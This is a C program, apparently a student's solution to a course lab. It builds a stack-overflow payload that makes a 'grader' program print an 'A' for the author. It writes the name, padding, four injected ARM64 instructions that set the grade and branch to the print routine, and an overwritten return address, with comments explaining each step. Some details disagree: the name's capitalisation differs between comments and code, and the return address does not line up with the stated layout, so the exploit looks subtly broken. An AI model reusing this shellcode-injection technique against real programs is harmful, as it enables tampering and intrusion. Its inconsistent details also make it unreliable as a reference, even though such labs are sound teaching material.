/*--------------------------------------------------------------------*/
/* createdataA.c                                                      */
/* author: anish                                                      */
/*--------------------------------------------------------------------*/
/*
   this program creates a file named "dataA" designed to cause the grader
   program to print a grade of 'A' for "anish". we do this by overrunning
   the stack buffer with carefully placed bytes:
   - write the name "anish" followed by a null terminator
   - pad with zero bytes for alignment
   - inject machine instructions (mov, adr, strb, b) via miniassembler
     to load 'A' into the grade variable, then branch to the print routine
   - fill remaining buffer space with zeros
   - overwrite the stored return address so execution jumps into our code

   by ensuring no newline characters and correct alignment, the grader
   will produce output indistinguishable from normal, but with an 'A' grade.
*/

/*
   main:
   - no command-line arguments processed
   - does not read from any input stream
   - writes a crafted sequence of bytes to "dataA"
   - returns 0 on success, 1 on failure (e.g., if file cannot open)
*/

#include <stdio.h>
#include <stdint.h>
#include "miniassembler.h"

/* define constants for clarity */
#define BUF_TOTAL    48        /* total buffer bytes */
#define GRADE_ADDR   0x420044  /* address of grade variable */
#define PRINT_ADDR   0x40089c  /* address to jump to for printing grade */
#define RET_ADDR     0x420078  /* overwritten return address */
#define NAME_ADDR    0x420058  /* starting address of name in memory */
#define NAME_LEN     5         /* "anish" length (no null) */
#define CODE_BYTES   16        /* four instructions, each 4 bytes */
#define PAD_COUNT    2         /* minimal alignment padding to get instructions on 4-byte boundary */
#define FILL_ZEROES  (BUF_TOTAL - (NAME_LEN+1) - PAD_COUNT - CODE_BYTES)
/* explanation:
   - NAME_LEN+1 = 6 bytes ("anish" + '\0')
   - plus PAD_COUNT = 6+2=8 bytes before instructions
   - plus CODE_BYTES=8+16=24 bytes after writing instructions
   - total so far =24, need total 48
   - 48-24=24 zero bytes after instructions to reach 48 bytes total */

/* using 'A' as 0x41 instead of char literal */
#define CHAR_A       0x41

int main(void) {
    const char *p_name = "Anish";
    FILE *fp_out = fopen("dataA", "w");
    if (!fp_out) return 1;

    /* instructions placeholders */
    unsigned int ui_mov;
    unsigned int ui_adr;
    unsigned int ui_strb;
    unsigned int ui_b;

    /* addresses and counters */
    unsigned long ul_overwrite_ret;
    int i;

    /* write name "Anish" + '\0' => 6 bytes total */
    fwrite(p_name, 1, NAME_LEN, fp_out);
    fputc('\0', fp_out);

    /* write PAD_COUNT (2) zero bytes to align instructions at a 4-byte boundary */
    for (i = 0; i < PAD_COUNT; i++) {
        fputc('\0', fp_out);
    }

    /* first generate all instructions:
       mov w0, CHAR_A       places 'A'(0x41) in w0
       adr x1, GRADE_ADDR,0x42007c calculates x1 = GRADE_ADDR using a chosen reference
       strb w0, [x1]        stores 'A' into grade
       b PRINT_ADDR,0x420084 branches to printing routine
       these addresses are magic numbers chosen to maintain correct offsets */
    ui_mov = MiniAssembler_mov(0, CHAR_A);
    ui_adr = MiniAssembler_adr(1, GRADE_ADDR, 0x42007c);
    ui_strb = MiniAssembler_strb(0, 1);
    ui_b   = MiniAssembler_b(PRINT_ADDR, 0x420084);

    /* now write the instructions in order */
    fwrite(&ui_mov, sizeof(unsigned int), 1, fp_out);
    fwrite(&ui_adr, sizeof(unsigned int), 1, fp_out);
    fwrite(&ui_strb, sizeof(unsigned int), 1, fp_out);
    fwrite(&ui_b, sizeof(unsigned int), 1, fp_out);

    /* fill remaining space in the 48-byte buffer with zeros (FILL_ZEROES=24) */
    for (i = 0; i < FILL_ZEROES; i++) {
        fputc('\0', fp_out);
    }

    /* finally, write the return address after the 48-byte buffer */
    ul_overwrite_ret = RET_ADDR;
    fwrite(&ul_overwrite_ret, sizeof(unsigned long), 1, fp_out);

    fclose(fp_out);
    return 0;
}